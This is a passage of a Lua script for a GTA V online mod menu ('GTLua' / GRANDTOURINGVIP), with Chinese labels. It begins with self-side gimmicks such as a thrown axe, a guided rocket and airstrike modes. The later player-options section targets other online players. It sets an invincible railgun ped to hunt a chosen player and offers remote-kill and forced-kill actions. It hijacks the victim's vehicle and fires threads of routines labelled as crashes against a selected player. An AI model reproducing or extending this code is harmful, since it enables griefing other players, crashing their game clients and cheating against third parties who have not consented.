                        ENTITY.SET_ENTITY_COLLISION(entity_axe, true, false)
                        ENTITY.SET_ENTITY_DYNAMIC(entity_axe, true)
                        ENTITY.SET_ENTITY_MAX_SPEED(entity_axe, 100.0)
                        local camrot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
                        ENTITY.SET_ENTITY_ROTATION(entity_axe, camrot.x, camrot.y, camrot.z, 1, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(entity_axe, 1, 60, 2000, 100, true, true, true, true)
                        local animation_dict = "weapons@first_person@aim_rng@generic@projectile@grenade_str"
                        local animation = "throw_m_fb_forward"
                        if not ENTITY.IS_ENTITY_PLAYING_ANIM(players.user_ped(), animation_dict, animation, 3) then
                            -- 请求动画字典
                            STREAMING.REQUEST_ANIM_DICT(animation_dict)
                            -- 等待动画字典加载完成
                            while not STREAMING.HAS_ANIM_DICT_LOADED(animation_dict) do
                                util.yield() -- 等待直到动画字典加载完成
                            end
                            -- 播放动画
                            TASK.TASK_PLAY_ANIM(players.user_ped(), animation_dict, animation, 8.00, 8.00, -1, 48, 0.0, false, false, false)
                            end
                        end
                    end
                end
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(entity_axe) and thrown then
                     local axe_pos = ENTITY.GET_ENTITY_COORDS(entity_axe)
                     FIRE.ADD_EXPLOSION(axe_pos.x, axe_pos.y, axe_pos.z, 2, 1.0, false, false, 1.0) 
                end
                -- 检测右键输入附加动作
                if attached and PAD.IS_CONTROL_JUST_PRESSED(0, 25) then
                    if ENTITY.DOES_ENTITY_EXIST(entity_axe) then 
                        local animation_dict = "cover@first_person@weapon@grenade"
                        local animation = "low_l_throw_long"
                        if not ENTITY.IS_ENTITY_PLAYING_ANIM(players.user_ped(), animation_dict, animation, 3) then
                            -- 请求动画字典
                            STREAMING.REQUEST_ANIM_DICT(animation_dict)
                            -- 等待动画字典加载完成
                            while not STREAMING.HAS_ANIM_DICT_LOADED(animation_dict) do
                                util.yield() -- 等待直到动画字典加载完成
                            end
                            -- 播放动画
                            TASK.TASK_PLAY_ANIM(players.user_ped(), animation_dict, animation, 8.00, 8.00, -1, 48, 0.0, false, false, false)
                        end
                    end
                    MISC.FORCE_LIGHTNING_FLASH()
                    thrown = false
                end
                if thrown then
                    -- 检测右键输入重新附加
                    if PAD.IS_CONTROL_JUST_PRESSED(0, 25) then
                        local player_ped = players.user_ped()
                        bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(player_ped, "IK_R_Hand")
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(entity_axe, player_ped, bone, 0.08, 0, -0.02, -100, -180, -10, false, false, true, true, 0, true, 0)
                        thrown = false
                    end
                else
                    if not attached then
                        -- 获取玩家位置
                        local player_coords = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
                        -- 增加角度，模拟旋转效果
                        angle = (angle + rotation_speed) % (2 * math.pi)
                        -- 计算目标位置：斧头围绕玩家旋转
                        local target_x = player_coords.x + radius * math.cos(angle)
                        local target_y = player_coords.y + radius * math.sin(angle)
                        local target_z = player_coords.z -- 斧头的高度保持与玩家一致
                        -- 获取斧头当前的位置
                        local axe_coords = ENTITY.GET_ENTITY_COORDS(entity_axe, true)
                        -- 计算方向向量：从斧头当前位置指向目标位置
                        local direction = {
                            x = target_x - axe_coords.x,
                            y = target_y - axe_coords.y,
                            z = target_z - axe_coords.z
                        }
                        -- 获取斧头的当前速度
                        local axe_velocity = ENTITY.GET_ENTITY_VELOCITY(entity_axe)
                        -- 计算要施加的力，使斧头沿着方向向量移动
                        local force_x = (direction.x * (speed * speed)) - (2.01 * speed * 0.3 * axe_velocity.x)
                        local force_y = (direction.y * (speed * speed)) - (2.01 * speed * 0.3 * axe_velocity.y)
                        local force_z = (direction.z * (speed * speed)) - (2.01 * speed * 0.3 * axe_velocity.z) + 0.1
                        -- 获取斧头的当前旋转
                        local rot = ENTITY.GET_ENTITY_ROTATION(entity_axe, 2)
                        -- 更新斧头旋转
                        ENTITY.SET_ENTITY_ROTATION(entity_axe, rot.x + 50 * speed, rot.y + 50 * speed, rot.z + 50 * speed, 0, 0)
                        -- 对斧头施加力
                        ENTITY.APPLY_FORCE_TO_ENTITY(
                            entity_axe,
                            3, -- 力的类型，3 表示持续力
                            force_x, force_y, force_z, -- 施加的力
                            0.0, 0.0, 0.0, -- 旋转力，这里可以不使用
                            0, -- 是否相对于世界坐标系
                            false, true, -- 忽略质量，自动生成碰撞
                            true -- 是否高度精准
                        )
                    end
                end
                -- 播放特效
                play_bone_looped_ptfx(entity_axe, 0, "scr_powerplay", "scr_powerplay", "sp_powerplay_beast_appear_trails", 0.5, false, 0, 0, 0)
                play_non_loop_ptfx(entity_axe, "scr_paletoscore", "scr_paletoscore", "scr_paleto_box_sparks", 0.1, false, 0, 0, 0)
            end)
        else
            entities.delete_by_handle(entity_axe)
        end
    end)
    GTTG(mastervip, "QQ飞车", {}, "Shift漂移,E氮气", function (f)
        if f then
            menu.trigger_commands("vehapplyground on")
            qqflytt = true
        else
            menu.trigger_commands("vehapplyground off")
            qqflytt = false
        end
    end)
    mastervip:toggle("作战堡垒", {}, "高处不胜寒.", function(on)
        local selfpos = players.get_position(players.user())
        local my_ped = players.user_ped()
        if on then
            request_model(util.joaat("xs_prop_arena_turret_01a_wl"))
            local axe1 = entities.create_object(util.joaat("xs_prop_arena_turret_01a_wl"), selfpos)
            tp_on_top(my_ped, axe1, true)
            hand1 = axe1
        else
            entities.delete_by_handle(hand1)
        end
    end)
    mastervip:toggle("超级英雄", {}, "", function(fly)
        f = fly 
        if fly then
            apply_fly_animations1()
            set_initial_position()
        else
            tp_my_pos()
            stop_atins()
            fly_forward_off()
            apply_fly_animations3() 
        end
    end)
    util.create_tick_handler(function()
        if f then
            fly_forward_on()
            return f
        end
    end)
    GTTG(mastervip, "武器追踪炮弹", {},'射击武器生效.',function(toggle)
        gUsingValkRocket = toggle
        if gUsingValkRocket then
            local rocket = 0
            local cam = 0
            local blip = 0
            local init = false
            local timer <const> = newTimer()
            local draw_rect = function(x, y, z, w)
                GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255, false)
            end
            while gUsingValkRocket do
                util.yield_once()
                if PED.IS_PED_SHOOTING(players.user_ped()) and not init then
                    init = true
                    timer.reset()
                elseif init then
                    if not ENTITY.DOES_ENTITY_EXIST(rocket) then
                        local offset = get_offset_from_cam(10)
                        rocket = entities.create_object(util.joaat("w_lr_rpg_rocket"), offset)
                        ENTITY.SET_ENTITY_INVINCIBLE(rocket, true)
                        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(rocket, true, 1)
                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.OBJ_TO_NET(rocket), true)
                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.OBJ_TO_NET(rocket), false)
                        ENTITY.SET_ENTITY_RECORDS_COLLISIONS(rocket, true)
                        ENTITY.SET_ENTITY_HAS_GRAVITY(rocket, false)
                        CAM.DESTROY_ALL_CAMS(true)
                        cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                        CAM.SET_CAM_NEAR_CLIP(cam, 0.01)
                        CAM.SET_CAM_NEAR_DOF(cam, 0.01)
                        GRAPHICS.CLEAR_TIMECYCLE_MODIFIER()
                        GRAPHICS.SET_TIMECYCLE_MODIFIER("CAMERA_secuirity")
                        CAM.HARD_ATTACH_CAM_TO_ENTITY(cam, rocket, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true)
                        CAM.SET_CAM_ACTIVE(cam, true)
                        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                        PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)
                        ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                    else
                        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
                        local coords = ENTITY.GET_ENTITY_COORDS(rocket, false)
                        local force = rot:toDir()
                        force:mul(40.0)
                        ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, true)
                        STREAMING.SET_FOCUS_POS_AND_VEL(coords.x, coords.y, coords.z, rot.x, rot.y, rot.z)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(rocket, 1, force.x, force.y, force.z, false, false, false, false)
                        HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
                        PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)
                        ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                        HUD.HUD_SUPPRESS_WEAPON_WHEEL_RESULTS_THIS_FRAME()
                        draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
                        draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
                        draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
                        draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
                        draw_rect(0.5 + 0.050, 0.5, 0.050, 0.002)
                        draw_rect(0.5 - 0.050, 0.5, 0.050, 0.002)
                        draw_rect(0.5, 0.500 + 0.05, 0.002, 0.05)
                        draw_rect(0.5, 0.500 - 0.05, 0.002, 0.05)
                        local maxTime = 7000 
                        local length = 0.5 - 0.5 * (timer.elapsed() / maxTime) 
                        local perc = length / 0.5
                        local color = get_blended_colour(perc)
                        GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 120, false)
                        GRAPHICS.DRAW_RECT(0.25, 0.75 - length / 2, 0.03, length, color.r, color.g, color.b, color.a, false)
                        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or length <= 0 then
                            local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket, false)
                            FIRE.ADD_EXPLOSION(impactCoord.x, impactCoord.y, impactCoord.z, 32, 1.0, true, false, 0.4, false)
                            entities.delete_by_handle(rocket)
                            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, false, 0)
                            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
                            STREAMING.CLEAR_FOCUS()
                            CAM.DESTROY_CAM(cam, true)
                            PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), false)
                            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                            rocket = 0
                            init = false
                        end
                    end
                end
            end
            if rocket and ENTITY.DOES_ENTITY_EXIST(rocket) then
                local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket, false)
                FIRE.ADD_EXPLOSION(impactCoord.x, impactCoord.y, impactCoord.z, 32, 1.0, true, false, 0.4, false)
                entities.delete_by_handle(rocket)
                STREAMING.CLEAR_FOCUS()
                CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, false, 0)
                CAM.DESTROY_CAM(cam, true)
                GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), false)
                if HUD.DOES_BLIP_EXIST(blip) then util.remove_blip(blip) end
                HUD.UNLOCK_MINIMAP_ANGLE()
                HUD.UNLOCK_MINIMAP_POSITION()
            end
        end
    end)
    kongx1 = GTTG(mastervip, '模式1',{},'',function(lsqs)
        luanshes = lsqs
        while luanshes do wait()
            local hash<const> = util.joaat("weapon_hominglauncher")
            local raycastResult = get_raycast_result(1000.0)
            WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
            if raycastResult.didHit and PED.IS_PED_SHOOTING(
                players.user_ped()) then
            local pos = raycastResult.endCoords
                for angle = 0, 359, 10 do
                    local radians = math.rad(angle)
                    local radius = 7 
                    local offsetX = radius * math.cos(radians)
                    local offsetY = radius * math.sin(radians)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                        pos.x + offsetX, pos.y + offsetY, pos.z + 35.0,
                        pos.x + offsetX, pos.y + offsetY, pos.z, 0,
                        true, hash, players.user_ped(),
                        true, false, 0)
                    wait(50)
                end
            end
        end 
        luanshes = false
    end)
    kongx2 = GTTG(mastervip, '模式2',{},'',function(lsq1)
        luanshe1 = lsq1
        while luanshe1 do wait()
            local hash1<const> = util.joaat("weapon_hominglauncher")
            local raycastResult1 = get_raycast_result(1000.0)
            WEAPON.REQUEST_WEAPON_ASSET(hash1, 31, 0)
            if raycastResult1.didHit and PED.IS_PED_SHOOTING(
                players.user_ped()) then
            local pos1 = raycastResult1.endCoords
                for i = 1, 40 do
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                        pos1.x + math.random(-10, 10),
                    pos1.y + math.random(-10, 10), pos1.z + 35.0
                    + math.random(-10, 10), pos1.x
                    + math.random(-10, 10),pos1.y
                    + math.random(-10, 10), pos1.z
                    + math.random(-10, 10), 0,
                    true, hash1,players.user_ped(),
                    true, false, 0)
                    wait(50)
                end
            end
        end luanshe1 = false
    end)
    kongx3 = GTTG(mastervip, '模式3',{""},'',function(lsq2)
        luanshe2 = lsq2
        while luanshe2 do wait()
            local hash2<const> = util.joaat("weapon_hominglauncher")
            local raycastResult2 = get_raycast_result(1000.0)
            WEAPON.REQUEST_WEAPON_ASSET(hash2, 31, 0)
            if raycastResult2.didHit and PED.IS_PED_SHOOTING(
                players.user_ped()) then
                local pos2 = raycastResult2.endCoords
                for offset = 1, 20, 1 do
                    local offsetX1 = offset
                    local offsetY1 = offset
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                        pos2.x, pos2.y, pos2.z + 35.0,
                        pos2.x - offsetX1, pos2.y - offsetY1, pos2.z, 0,
                        true, hash2, players.user_ped(),
                        true, false, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                        pos2.x, pos2.y, pos2.z + 35.0,
                        pos2.x + offsetX1, pos2.y + offsetY1, pos2.z, 0,
                        true, hash2, players.user_ped(),
                        true, false, 0)
                    wait(50)
                end
            end
        end 
        luanshe2 = false
    end)
    menu.set_visible(kongx1, false)
    menu.set_visible(kongx2, false)
    menu.set_visible(kongx3, false)
    local func_mode = 1
    local last_key_state = false
    local circle_size = {
        {x = .75, y = .9, radius = 0.025},
        {x = .8, y = .9, radius = 0.02},
        {x = .85, y = .9, radius = 0.02}
    }
    kxpress = GTLP(mastervip, '空袭枪[功能模式]', {}, '按E切换模式类型\n三种模式三种不同的空袭效果', function()
        for i = 1, 3 do
            directx.draw_circle(circle_size[i].x, circle_size[i].y, 
            circle_size[i].radius, 0, 0, 1, 1, -1)
            directx.draw_text(circle_size[i].x-0.01, circle_size[i].y, '模式' .. i,
            ALIGN_TOP_LEFT, circle_size[i].radius + 0.48, 0, 1, 0, 1)
        end
        local current_key_state = util.is_key_down(0x45)
        if current_key_state and not last_key_state then
            func_mode = func_mode + 1
            if func_mode > 3 then
                func_mode = 1
            end
            for i = 1, 3 do
                circle_size[i].radius = 0.02 
            end
            if func_mode == 1 then
                gtoast("模式1已启用")
                menu.set_value(kongx1, true)
                menu.set_value(kongx2, false)
                menu.set_value(kongx3, false)
            elseif func_mode == 2 then
                gtoast("模式2已启用")
                menu.set_value(kongx1, false)
                menu.set_value(kongx2, true)
                menu.set_value(kongx3, false)
            elseif func_mode == 3 then
                gtoast("模式3已启用")
                menu.set_value(kongx1, false)
                menu.set_value(kongx2, false)
                menu.set_value(kongx3, true)
            end
            circle_size[func_mode].radius = 0.025 
        end
        last_key_state = current_key_state
    end)
    util.create_tick_handler(function ()
        wait()
        if menu.get_value(kxpress) == false then
            kongx1.value = false
            kongx2.value = false
            kongx3.value = false
        end
    end)
    GTTG(mastervip, '骑妹妹', {}, '可操控走路,按W移动方向即可行走\n妹妹是无敌的', function(on)
        if on then
            request_model(0x9CF26183)
            local mypid = PLAYER.PLAYER_PED_ID()
            local coods = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            Mounts1 = PED.CREATE_PED(26, 0x9CF26183, coods.x, coods.y + 1, coods.z, 0, true, false)
            while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
                STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
                wait()
            end
            ENTITY.ATTACH_ENTITY_TO_ENTITY(mypid, Mounts1, PED.GET_PED_BONE_INDEX(Mounts1, 0), 0.0, -0.2, 0.60, 0.0, 0.0,
                180, true, true, true, true, 2, true)
            ENTITY.SET_ENTITY_INVINCIBLE(Mounts1, true)
            TASK.TASK_PLAY_ANIM(mypid, "rcmjosh2", "josh_sitting_loop", 3.0, 2.0, -1, 3, 1.0, false, false, false)
            util.create_tick_handler(function()
                if (util.is_key_down(0x57)) then
                    local location = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                    local CamRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
                    local Distance = 5
                    local SpawnPosition = location
                    SpawnPosition.x = location.x - (math.sin(math.rad(CamRot.z)) * Distance)
                    SpawnPosition.y = location.y + (math.cos(math.rad(CamRot.z)) * Distance)
                    SpawnPosition.z = location.z
                    TASK.TASK_GO_STRAIGHT_TO_COORD(Mounts1, SpawnPosition.x, SpawnPosition.y, SpawnPosition.z, 120, 10,
                        CamRot.z, 0)
                end
            end)
        else
            TASK.CLEAR_PED_TASKS(players.user_ped())
            entities.delete_by_handle(Mounts1)
        end
    end)
    GTTG(mastervip, '鬼上身', {}, '被鬼附体', function(on)
        if on then
            request_model(0x9CF26183)
            mypid1 = PLAYER.PLAYER_PED_ID()
            local ghost_hashes = {util.joaat('m23_1_prop_m31_ghostzombie_01a'),
                                util.joaat('m23_1_prop_m31_ghostjohnny_01a'),
                                util.joaat('m23_1_prop_m31_ghostrurmeth_01a'),
                                util.joaat('m23_1_prop_m31_ghostsalton_01a'),
                                util.joaat('m23_1_prop_m31_ghostskidrow_01a')}
            local ghost_hash = ghost_hashes[math.random(#ghost_hashes)]
            request_model(ghost_hash)
            local coos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(players.user_ped()), true)
            nvgui = PED.CREATE_PED(26, 0x9CF26183, coos.x, coos.y, coos.z, 0, true, false)
            ghost1 = OBJECT.CREATE_OBJECT(ghost_hash, coos.x, coos.y, coos.z - 1, true, true, false)
            ENTITY.SET_ENTITY_VISIBLE(nvgui, false)
            ENTITY.SET_ENTITY_VISIBLE(mypid1, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ghost1, nvgui, 0, 0, 0, 0, 0, 0, 180, false, false, false, true, 0, true, true)
            while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
                STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
                wait()
            end
            ENTITY.ATTACH_ENTITY_TO_ENTITY(nvgui, mypid1, 0, 0.0, 0, 0, 0.0, 0.0, 0, true, true, true, true, 2, true)
        else
            entities.delete_by_handle(ghost1)
            entities.delete_by_handle(nvgui)
            ENTITY.SET_ENTITY_VISIBLE(mypid1, true)
        end
    end)
    GTTG(mastervip, '上鬼身', {}, '鬼成为你的座驾', function(on)
        if on then
            request_model(0x9CF26183)
            local mypid = PLAYER.PLAYER_PED_ID()
            local ghost_hashes = {util.joaat('m23_1_prop_m31_ghostzombie_01a'),
                                util.joaat('m23_1_prop_m31_ghostjohnny_01a'),
                                util.joaat('m23_1_prop_m31_ghostrurmeth_01a'),
                                util.joaat('m23_1_prop_m31_ghostsalton_01a'),
                                util.joaat('m23_1_prop_m31_ghostskidrow_01a')}
            local ghost_hash = ghost_hashes[math.random(#ghost_hashes)]
            request_model(ghost_hash)
            local coos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(players.user_ped()), true)
            meimei = PED.CREATE_PED(26, 0x9CF26183, coos.x, coos.y, coos.z, 0, true, false)
            ghost = OBJECT.CREATE_OBJECT(ghost_hash, coos.x, coos.y, coos.z, true, true, false)
            ENTITY.SET_ENTITY_VISIBLE(meimei, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ghost, meimei, 0, 0, 0, -1, 0, 0, 180, 180, false, false, false, true, 0, true,
                true)
            while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
                STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
                wait()
            end
            ENTITY.ATTACH_ENTITY_TO_ENTITY(mypid, meimei, PED.GET_PED_BONE_INDEX(meimei, 0), 0.0, -0.2, 0.60, 0.0, 0.0, 180,
                true, true, true, true, 2, true)
            TASK.TASK_PLAY_ANIM(mypid, "rcmjosh2", "josh_sitting_loop", 3.0, 2.0, -1, 3, 1.0, false, false, false)
            util.create_tick_handler(function()
                if (util.is_key_down(0x57)) then
                    local location = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                    local CamRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
                    local Distance = 5
                    local SpawnPosition = location
                    SpawnPosition.x = location.x - (math.sin(math.rad(CamRot.z)) * Distance)
                    SpawnPosition.y = location.y + (math.cos(math.rad(CamRot.z)) * Distance)
                    SpawnPosition.z = location.z
                    TASK.TASK_GO_STRAIGHT_TO_COORD(meimei, SpawnPosition.x, SpawnPosition.y, SpawnPosition.z, 120, 10,
                        CamRot.z, 0)
                end
            end)
        else
            TASK.CLEAR_PED_TASKS(players.user_ped())
            entities.delete_by_handle(meimei)
            entities.delete_by_handle(ghost)
        end
    end)
end
function egaoxuanxianggongneng()
function playerActionsSetup(pid)
GTROOT = menu.shadow_root():list('GRANDTOURINGVIP', {"gtluaplayer"}, "GTVIP YYDS\n点击进入GTVIP玩家选项")
GTROOT = menu.player_root(pid):getChildren()[1]:attachBefore(GTROOT)
GTD(GTROOT, "GRANDTOURINGVIP")
GT = GTluaScript.list
local name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
for _, idx in ipairs(sxid) do
    if name then
        SxMainMenu = GT(GTROOT, "GTLua Ultra 無你有我  ~>'.'<~")
        GTD(SxMainMenu, "随时关注这里")

        GTAC(SxMainMenu,"赠送一个寄吧车", {}, "", function()
            vehBigOrangeDick(pid, false)
        end)

        SxMainMenu:toggle("无限火力追踪击杀", {}, "", function(stats)
            local blackped = util.joaat('S_M_Y_Doorman_01')
            local pid_coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0, 0)
            pid_coords.y = pid_coords.y - 2
            local pop_black = CreatePed(-1, blackped, pid_coords, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(pop_black, true)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(pop_black), false)
            boolt = stats
            local playerDead = false
            local boneIds = {12844, 10706, 18905, 14201, 65245}
            local currentBoneIndex = 1  
            local boneSwitchTimer = 0 
            while boolt do
                wait()
                PED.SET_PED_CAN_RAGDOLL(pop_black, false)
                ENTITY.SET_ENTITY_PROOFS(pop_black, true, true, true, true, true, false, false, true)
                if ENTITY.IS_ENTITY_DEAD(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) then
                    if not playerDead then
                        playerDead = true
                        TASK.CLEAR_PED_TASKS(pop_black)
                    end
                else
                    if playerDead then
                        local pid_coords = players.get_position(pid)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(pop_black, pid_coords.x, pid_coords.y, pid_coords.z, false, false, false)
                        playerDead = false
                    end
                    local playerpos = players.get_position(pid)
                    local boneId = boneIds[currentBoneIndex]
                    local boneCoords = PED.GET_PED_BONE_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), boneId, 0.0, 0.0, 0.0)
                    WEAPON.GIVE_WEAPON_TO_PED(pop_black, util.joaat("WEAPON_RAILGUN"), 9999, true, true)
                    TASK.TASK_GO_TO_COORD_WHILE_AIMING_AT_COORD(
                        pop_black, playerpos.x, playerpos.y, playerpos.z,
                        boneCoords.x, boneCoords.y, boneCoords.z,
                        5.0, true, 3.0, 5.0, false, 0, true, util.joaat('FIRING_PATTERN_FULL_AUTO')
                    )
                    boneSwitchTimer = boneSwitchTimer + 1
                    if boneSwitchTimer >= 20 then 
                        currentBoneIndex = currentBoneIndex + 1
                        if currentBoneIndex > #boneIds then
                            currentBoneIndex = 1
                        end
                        boneSwitchTimer = 0 
                    end
                end
            end
            Plack = pop_black
            if not boolt then
                entities.delete_by_handle(Plack)
                WEAPON.REMOVE_WEAPON_FROM_PED(Plack, util.joaat("WEAPON_RAILGUN"))
            end
        end)
        SxMainMenu:action("远程击杀", {}, "", function()
            local pid_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0, 0) pid_pos.z +=  50
            local pop_ent = CreatePed(-1, joaat('S_M_M_Janitor'), pid_pos, 0)
            ENTITY.FREEZE_ENTITY_POSITION(pop_ent,true)
            ENTITY.SET_ENTITY_INVINCIBLE(pop_ent, true)
            ENTITY.SET_ENTITY_VISIBLE(pop_ent,false)
            WEAPON.GIVE_WEAPON_TO_PED(pop_ent, joaat('WEAPON_RAILGUN'), 9999, true, true)
            util.create_tick_handler(function()
                local playerpos = players.get_position(pid)
                TASK.TASK_GO_TO_COORD_WHILE_AIMING_AT_COORD(
                pop_ent, playerpos.x, playerpos.y, playerpos.z,
                playerpos.x, playerpos.y, playerpos.z,
                5.0, true, 3.0, 5.0, false, 0, true, joaat('FIRING_PATTERN_FULL_AUTO'))
                pop_enthash = pop_ent
                if ENTITY.IS_ENTITY_DEAD(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) then
                    entities.delete(pop_enthash)
                end
            end)
        end)
        SxMainMenu:action("强制击杀", {}, "", function()
            player_pos = players.get_position(pid)
            origin_pos = players.get_position(players.user())
            if player_pos:distance(origin_pos) < 2500 then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(),player_pos.x + 1000, player_pos.y + 1000, player_pos.z + 1000) 
            end
            WEAPON.REQUEST_WEAPON_ASSET(util.joaat("WEAPON_TRANQUILIZER"),31,0)
            NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            wait(1000)
                local pos = players.get_position(pid)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+0.02 , pos.y, pos.z, pos.x, pos.y, pos.z, 0,
                    true,util.joaat("WEAPON_TRANQUILIZER"),players.user_ped(), true, true, 999)
                    wait(200)
            wait(3000)
            NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(),origin_pos.x, origin_pos.y, origin_pos.z) 
        end)
        GTAC(SxMainMenu,"载具远程控制", {}, "强制进入对方车辆操控,可能导致对方死亡(作弊者事件TA),还有可能导致对方崩溃\n请先观看后使用效果更佳", function()
            local myvehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
            --menu.trigger_commands("spectate"..players.get_name(pid) .." on")
            wait(1000)
            remote_control_vehicle(myvehicle)
        end)
        GTAC(SxMainMenu, "RIP Something", {}, "", function ()
            crashstand(pid)
            util.create_thread(function() idoula(pid) end)
            util.create_thread(function() idoulb(pid) end)
            util.create_thread(function() idoulc(pid) end)
            util.create_thread(function() idould(pid) end)
            util.create_thread(function() idoule(pid) end)
            util.create_thread(function() idoulf(pid) end)
            util.create_thread(function() idoulg(pid) end)
            util.create_thread(function() idoulh(pid) end)
            util.create_thread(function() idouli(pid) end)
            util.create_thread(function() idoulj(pid) end)
        end)
        GTAC(SxMainMenu,"网络实体集成", {}, "[崩溃选项]:落地再继续", function()
            util.create_thread(function() idoula(pid) end)
            util.create_thread(function() idoulb(pid) end)
            util.create_thread(function() idoulc(pid) end)
            util.create_thread(function() idould(pid) end)
            util.create_thread(function() idoule(pid) end)
            util.create_thread(function() idoulf(pid) end)
            util.create_thread(function() idoulg(pid) end)
            util.create_thread(function() idoulh(pid) end)
            util.create_thread(function() idouli(pid) end)
            util.create_thread(function() idoulj(pid) end)
        end)
        GTAC(SxMainMenu,'何度未简',{},'',function()
            util.create_thread(function ()
                local weapon_ped <const> = entityspawn_entity(joaat("A_C_Rat"), players.get_position(pid), 0, false, false, false, false, true)
                WEAPON.GIVE_WEAPON_TO_PED(weapon_ped, joaat("WEAPON_GRENADE"), 1, true, true)
                local pos <const> = players.get_position(pid)
                TASK.TASK_THROW_PROJECTILE(weapon_ped, pos.x, pos.y, pos.z, 0, false)
                wait(1000)
                entitydelete_entity(weapon_ped)
            end)
            util.create_thread(function ()
                local pos <const> = players.get_position(pid)
                pos.z = pos.z + 10
                local A_C_Rat <const> = entityspawn_entity(joaat("A_C_Rat"), pos, 0, false, true, true, false, true)
                local BMX <const> = entityspawn_entity(joaat("thruster"), pos, 0, false, true, true, true, true)
                local time <const> = util.current_time_millis() + 2500
                while time > util.current_time_millis() do
                    PED.SET_PED_INTO_VEHICLE(A_C_Rat, BMX, -1)
                    ENTITY.SET_ENTITY_HEALTH(A_C_Rat, 0, 0)
                    TASK.TASK_LEAVE_VEHICLE(A_C_Rat, BMX, 0)
                    wait(100)
                    ENTITY.SET_ENTITY_HEALTH(A_C_Rat, 0, 100.0)
                end
                entitydelete_entity(A_C_Rat)
                entitydelete_entity(BMX)
            end)
            util.create_thread(function ()
                local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                pos.z += 10
                local ranger <const> = entityspawn_entity(joaat("u_m_y_rsranger_01"), pos, 0, true, true, true, true, true)
                local time <const> = util.current_time_millis() + 5000
                while time > util.current_time_millis() do
